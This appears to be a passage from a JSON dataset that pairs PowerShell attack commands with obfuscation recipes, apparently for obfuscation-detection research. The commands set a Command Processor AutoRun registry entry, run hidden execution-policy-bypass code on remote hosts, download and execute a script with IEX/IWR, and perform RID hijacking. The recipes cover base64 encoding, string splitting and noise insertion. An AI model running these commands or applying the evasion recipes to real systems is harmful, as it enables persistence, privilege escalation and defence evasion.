    "origin_cmd": "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -Value \"${command}\" -PropertyType \"String\""
  },
  {
    "input": "False",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Create a new registry item for Command Processor AutoRun",
    "origin_cmd": "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -Value \"${command}\" -PropertyType \"String\""
  },
  {
    "input": "Create a new registry item for Command Processor AutoRun",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a new registry item for Command Processor AutoRun",
    "origin_cmd": "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -Value \"${command}\" -PropertyType \"String\""
  },
  {
    "input": "Create a new registry item for Command Processor AutoRun",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Create a new registry item for Command Processor AutoRun",
    "origin_cmd": "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -Value \"${command}\" -PropertyType \"String\""
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a new registry item for Command Processor AutoRun",
    "origin_cmd": "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -Value \"${command}\" -PropertyType \"String\""
  },
  {
    "input": "False",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Create a new registry item for Command Processor AutoRun",
    "origin_cmd": "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -Value \"${command}\" -PropertyType \"String\""
  },
  {
    "input": "Create a new registry item for Command Processor AutoRun",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a new registry item for Command Processor AutoRun",
    "origin_cmd": "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -Value \"${command}\" -PropertyType \"String\""
  },
  {
    "input": "Create a new registry item for Command Processor AutoRun",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Create a new registry item for Command Processor AutoRun",
    "origin_cmd": "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -Value \"${command}\" -PropertyType \"String\""
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a new registry item for Command Processor AutoRun",
    "origin_cmd": "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -Value \"${command}\" -PropertyType \"String\""
  },
  {
    "input": "False",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Create a new registry item for Command Processor AutoRun",
    "origin_cmd": "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -Value \"${command}\" -PropertyType \"String\""
  },
  {
    "input": "Create a new registry item for Command Processor AutoRun",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a new registry item for Command Processor AutoRun",
    "origin_cmd": "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -Value \"${command}\" -PropertyType \"String\""
  },
  {
    "input": "Create a new registry item for Command Processor AutoRun",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Create a new registry item for Command Processor AutoRun",
    "origin_cmd": "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -Value \"${command}\" -PropertyType \"String\""
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a new registry item for Command Processor AutoRun",
    "origin_cmd": "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -Value \"${command}\" -PropertyType \"String\""
  },
  {
    "input": "False",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Create a new registry item for Command Processor AutoRun",
    "origin_cmd": "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -Value \"${command}\" -PropertyType \"String\""
  },
  {
    "input": "Create a new registry item for Command Processor AutoRun",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a new registry item for Command Processor AutoRun",
    "origin_cmd": "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -Value \"${command}\" -PropertyType \"String\""
  },
  {
    "input": "Invoke a PowerShell script block on a remote computer with specific settings",
    "output": "Invoke-Command -ComputerName <Target_IP> -ScriptBlock {powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command <Evil_Script>}",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with specific settings",
    "origin_cmd": "Invoke-Command -ComputerName <Target_IP> -ScriptBlock {powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command <Evil_Script>}"
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with specific settings",
    "origin_cmd": "Invoke-Command -ComputerName <Target_IP> -ScriptBlock {powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command <Evil_Script>}"
  },
  {
    "input": "False",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with specific settings",
    "origin_cmd": "Invoke-Command -ComputerName <Target_IP> -ScriptBlock {powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command <Evil_Script>}"
  },
  {
    "input": "Invoke a PowerShell script block on a remote computer with specific settings",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with specific settings",
    "origin_cmd": "Invoke-Command -ComputerName <Target_IP> -ScriptBlock {powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command <Evil_Script>}"
  },
  {
    "input": "Invoke a PowerShell script block on a remote computer with specific settings",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with specific settings",
    "origin_cmd": "Invoke-Command -ComputerName <Target_IP> -ScriptBlock {powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command <Evil_Script>}"
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with specific settings",
    "origin_cmd": "Invoke-Command -ComputerName <Target_IP> -ScriptBlock {powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command <Evil_Script>}"
  },
  {
    "input": "False",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with specific settings",
    "origin_cmd": "Invoke-Command -ComputerName <Target_IP> -ScriptBlock {powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command <Evil_Script>}"
  },
  {
    "input": "Invoke a PowerShell script block on a remote computer with specific settings",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with specific settings",
    "origin_cmd": "Invoke-Command -ComputerName <Target_IP> -ScriptBlock {powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command <Evil_Script>}"
  },
  {
    "input": "Invoke a PowerShell script block on a remote computer with specific settings",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with specific settings",
    "origin_cmd": "Invoke-Command -ComputerName <Target_IP> -ScriptBlock {powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command <Evil_Script>}"
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with specific settings",
    "origin_cmd": "Invoke-Command -ComputerName <Target_IP> -ScriptBlock {powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command <Evil_Script>}"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with specific settings",
    "origin_cmd": "Invoke-Command -ComputerName <Target_IP> -ScriptBlock {powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command <Evil_Script>}"
  },
  {
    "input": "Invoke a PowerShell script block on a remote computer with specific settings",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with specific settings",
    "origin_cmd": "Invoke-Command -ComputerName <Target_IP> -ScriptBlock {powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command <Evil_Script>}"
  },
  {
    "input": "Invoke a PowerShell script block on a remote computer with specific settings",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with specific settings",
    "origin_cmd": "Invoke-Command -ComputerName <Target_IP> -ScriptBlock {powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command <Evil_Script>}"
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with specific settings",
    "origin_cmd": "Invoke-Command -ComputerName <Target_IP> -ScriptBlock {powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command <Evil_Script>}"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with specific settings",
    "origin_cmd": "Invoke-Command -ComputerName <Target_IP> -ScriptBlock {powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command <Evil_Script>}"
  },
  {
    "input": "Invoke a PowerShell script block on a remote computer with specific settings",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with specific settings",
    "origin_cmd": "Invoke-Command -ComputerName <Target_IP> -ScriptBlock {powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command <Evil_Script>}"
  },
  {
    "input": "Download and execute RemoteCertTrust.ps1 script from Atomic Red Team repository",
    "output": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Download and execute RemoteCertTrust.ps1 script from Atomic Red Team repository",
    "origin_cmd": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)"
  },
  {
    "input": "False",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute RemoteCertTrust.ps1 script from Atomic Red Team repository",
    "origin_cmd": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)"
  },
  {
    "input": "Download and execute RemoteCertTrust.ps1 script from Atomic Red Team repository",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute RemoteCertTrust.ps1 script from Atomic Red Team repository",
    "origin_cmd": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)"
  },
  {
    "input": "False",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute RemoteCertTrust.ps1 script from Atomic Red Team repository",
    "origin_cmd": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)"
  },
  {
    "input": "Download and execute RemoteCertTrust.ps1 script from Atomic Red Team repository",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Download and execute RemoteCertTrust.ps1 script from Atomic Red Team repository",
    "origin_cmd": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)"
  },
  {
    "input": "False",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute RemoteCertTrust.ps1 script from Atomic Red Team repository",
    "origin_cmd": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)"
  },
  {
    "input": "Download and execute RemoteCertTrust.ps1 script from Atomic Red Team repository",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Download and execute RemoteCertTrust.ps1 script from Atomic Red Team repository",
    "origin_cmd": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)"
  },
  {
    "input": "False",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute RemoteCertTrust.ps1 script from Atomic Red Team repository",
    "origin_cmd": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)"
  },
  {
    "input": "Download and execute RemoteCertTrust.ps1 script from Atomic Red Team repository",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute RemoteCertTrust.ps1 script from Atomic Red Team repository",
    "origin_cmd": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)"
  },
  {
    "input": "False",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute RemoteCertTrust.ps1 script from Atomic Red Team repository",
    "origin_cmd": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)"
  },
  {
    "input": "Download and execute RemoteCertTrust.ps1 script from Atomic Red Team repository",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute RemoteCertTrust.ps1 script from Atomic Red Team repository",
    "origin_cmd": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)"
  },
  {
    "input": "False",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute RemoteCertTrust.ps1 script from Atomic Red Team repository",
    "origin_cmd": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)"
  },
  {
    "input": "Download and execute RemoteCertTrust.ps1 script from Atomic Red Team repository",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute RemoteCertTrust.ps1 script from Atomic Red Team repository",
    "origin_cmd": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)"
  },
  {
    "input": "False",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute RemoteCertTrust.ps1 script from Atomic Red Team repository",
    "origin_cmd": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)"
  },
  {
    "input": "Download and execute RemoteCertTrust.ps1 script from Atomic Red Team repository",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute RemoteCertTrust.ps1 script from Atomic Red Team repository",
    "origin_cmd": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)"
  },
  {
    "input": "False",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute RemoteCertTrust.ps1 script from Atomic Red Team repository",
    "origin_cmd": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)"
  },
  {
    "input": "Invoke Resource SID Hijacking for the specified user, RID, and password",
    "output": "Invoke-RIDHijacking -User alice -RID 500 -Password Password1",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Invoke Resource SID Hijacking for the specified user, RID, and password",
    "origin_cmd": "Invoke-RIDHijacking -User alice -RID 500 -Password Password1"
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke Resource SID Hijacking for the specified user, RID, and password",
    "origin_cmd": "Invoke-RIDHijacking -User alice -RID 500 -Password Password1"
  },
  {
    "input": "False",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Invoke Resource SID Hijacking for the specified user, RID, and password",
    "origin_cmd": "Invoke-RIDHijacking -User alice -RID 500 -Password Password1"
  },
  {
    "input": "Invoke Resource SID Hijacking for the specified user, RID, and password",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke Resource SID Hijacking for the specified user, RID, and password",
    "origin_cmd": "Invoke-RIDHijacking -User alice -RID 500 -Password Password1"
  },
  {
    "input": "Invoke Resource SID Hijacking for the specified user, RID, and password",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Invoke Resource SID Hijacking for the specified user, RID, and password",
    "origin_cmd": "Invoke-RIDHijacking -User alice -RID 500 -Password Password1"
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke Resource SID Hijacking for the specified user, RID, and password",
    "origin_cmd": "Invoke-RIDHijacking -User alice -RID 500 -Password Password1"
  },
  {
    "input": "False",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Invoke Resource SID Hijacking for the specified user, RID, and password",
    "origin_cmd": "Invoke-RIDHijacking -User alice -RID 500 -Password Password1"
  },
  {
    "input": "Invoke Resource SID Hijacking for the specified user, RID, and password",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke Resource SID Hijacking for the specified user, RID, and password",
    "origin_cmd": "Invoke-RIDHijacking -User alice -RID 500 -Password Password1"
  },
  {
    "input": "Invoke Resource SID Hijacking for the specified user, RID, and password",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Invoke Resource SID Hijacking for the specified user, RID, and password",
    "origin_cmd": "Invoke-RIDHijacking -User alice -RID 500 -Password Password1"
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke Resource SID Hijacking for the specified user, RID, and password",
    "origin_cmd": "Invoke-RIDHijacking -User alice -RID 500 -Password Password1"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Invoke Resource SID Hijacking for the specified user, RID, and password",
    "origin_cmd": "Invoke-RIDHijacking -User alice -RID 500 -Password Password1"
  },
  {
    "input": "Invoke Resource SID Hijacking for the specified user, RID, and password",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke Resource SID Hijacking for the specified user, RID, and password",
    "origin_cmd": "Invoke-RIDHijacking -User alice -RID 500 -Password Password1"
  },
  {
    "input": "Invoke Resource SID Hijacking for the specified user, RID, and password",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Invoke Resource SID Hijacking for the specified user, RID, and password",
    "origin_cmd": "Invoke-RIDHijacking -User alice -RID 500 -Password Password1"
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke Resource SID Hijacking for the specified user, RID, and password",
    "origin_cmd": "Invoke-RIDHijacking -User alice -RID 500 -Password Password1"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Invoke Resource SID Hijacking for the specified user, RID, and password",
    "origin_cmd": "Invoke-RIDHijacking -User alice -RID 500 -Password Password1"
  },
  {
    "input": "Invoke Resource SID Hijacking for the specified user, RID, and password",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke Resource SID Hijacking for the specified user, RID, and password",
    "origin_cmd": "Invoke-RIDHijacking -User alice -RID 500 -Password Password1"
  },
  {
    "input": "Invoke a PowerShell script block on a remote computer with malicious code",
    "output": "Invoke-Command -ComputerName <target_ip> -ScriptBlock { <malicious_code> }",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with malicious code",
    "origin_cmd": "Invoke-Command -ComputerName <target_ip> -ScriptBlock { <malicious_code> }"
  },
  {
    "input": "False",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with malicious code",
    "origin_cmd": "Invoke-Command -ComputerName <target_ip> -ScriptBlock { <malicious_code> }"
  },
  {
    "input": "Invoke a PowerShell script block on a remote computer with malicious code",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with malicious code",
    "origin_cmd": "Invoke-Command -ComputerName <target_ip> -ScriptBlock { <malicious_code> }"
  },
  {
    "input": "False",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with malicious code",
    "origin_cmd": "Invoke-Command -ComputerName <target_ip> -ScriptBlock { <malicious_code> }"
  },
  {
    "input": "Invoke a PowerShell script block on a remote computer with malicious code",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with malicious code",
    "origin_cmd": "Invoke-Command -ComputerName <target_ip> -ScriptBlock { <malicious_code> }"
  },
  {
    "input": "False",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with malicious code",
    "origin_cmd": "Invoke-Command -ComputerName <target_ip> -ScriptBlock { <malicious_code> }"
  },
  {
    "input": "Invoke a PowerShell script block on a remote computer with malicious code",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with malicious code",
    "origin_cmd": "Invoke-Command -ComputerName <target_ip> -ScriptBlock { <malicious_code> }"
  },
  {
    "input": "False",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with malicious code",
    "origin_cmd": "Invoke-Command -ComputerName <target_ip> -ScriptBlock { <malicious_code> }"
  },
  {
    "input": "Invoke a PowerShell script block on a remote computer with malicious code",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with malicious code",
    "origin_cmd": "Invoke-Command -ComputerName <target_ip> -ScriptBlock { <malicious_code> }"
  },
  {
    "input": "False",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with malicious code",
    "origin_cmd": "Invoke-Command -ComputerName <target_ip> -ScriptBlock { <malicious_code> }"
  },
  {
    "input": "Invoke a PowerShell script block on a remote computer with malicious code",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with malicious code",
    "origin_cmd": "Invoke-Command -ComputerName <target_ip> -ScriptBlock { <malicious_code> }"
  },
  {
    "input": "False",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with malicious code",
    "origin_cmd": "Invoke-Command -ComputerName <target_ip> -ScriptBlock { <malicious_code> }"
  },
  {
    "input": "Invoke a PowerShell script block on a remote computer with malicious code",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with malicious code",
    "origin_cmd": "Invoke-Command -ComputerName <target_ip> -ScriptBlock { <malicious_code> }"
  },
  {
    "input": "False",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with malicious code",
    "origin_cmd": "Invoke-Command -ComputerName <target_ip> -ScriptBlock { <malicious_code> }"
  },
  {
    "input": "Invoke a PowerShell script block on a remote computer with malicious code",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Invoke a PowerShell script block on a remote computer with malicious code",
